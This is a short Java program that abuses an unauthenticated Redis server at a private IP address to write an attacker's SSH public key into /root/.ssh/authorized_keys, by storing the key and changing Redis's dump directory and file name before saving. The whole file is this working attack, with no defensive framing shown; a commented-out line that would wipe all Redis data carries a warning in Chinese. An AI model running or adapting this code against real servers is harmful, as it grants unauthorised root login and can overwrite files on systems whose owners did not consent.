package cn.b1ue.redis.filewrite.linux;

import redis.clients.jedis.Jedis;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2020/4/3 14:49
 */
public class SSHKey {

    public static void main(String[] args) {

        String key = "ssh-rsa AAAAA3NzaC1yc2EAAAADAQABAABBAQDL3yB17Wkg9HXk0mPj00g3D6Ps+o+NEL2xneDonJGxzOkV6pGBnL7fy2Z1QbjET9FU3n3E7ixOoRgyI3ZifXcVOi3ADX/4oQHQuEuIXh3cGI/B96hGk6voMIFZ96E4MRz4iTsTX3KqgyXfvFgy6j9U60ybV+R3uM9r4QjDN9OfNNwCRh5zWxNDSmuakXZILmJmtCgMSjQZU7bjbsdlQqn24kiJkAT8r8YN9dL5+E+vfj/TQpfuhDK+0++LUv5Ax7J2uIQ7hXwGpHkaUDDUk8njn4SesBzLQ5PovLTcXHla6kl7pGI/bZ/T+1PUSrIeaG3nzpwwGaI4CH7xf/J9R2jN blue@ixsec.org";

        Jedis jedis = new Jedis("192.168.91.147", 6379);
        //jedis.flushAll();  //此方法会删除redis的所有数据，不要在生产环境调用此方法
        jedis.set("x", "\n\n"+key+"\n\n");
        jedis.configSet("dir","/root/.ssh/");
        jedis.configSet("dbfilename","authorized_keys");
        jedis.save();
        jedis.close();

    }

}
